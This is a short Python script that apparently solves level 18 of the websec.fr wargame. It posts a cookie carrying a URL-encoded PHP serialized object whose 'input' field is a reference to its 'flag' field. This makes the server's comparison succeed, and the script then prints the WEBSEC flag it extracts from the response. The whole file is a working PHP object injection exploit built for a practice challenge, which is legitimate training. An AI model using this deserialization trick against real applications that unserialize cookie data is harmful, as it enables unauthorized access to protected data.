from requests import *

url = 'https://websec.fr/level18/index.php'
s = Session()
cookies = {
    'obj' : 'O%3a8%3a%22stdClass%22%3a2%3a%7bs%3a4%3a%22flag%22%3bi%3a1234%3bs%3a5%3a%22input%22%3bR%3a2%3b%7d'
}

r = s.post(url , cookies=cookies)
pos = r.text.find('WEBSEC{')
while(True):
    print(r.text[pos] , end='')
    if (r.text[pos] == '}'):
        print()
        break
    pos += 1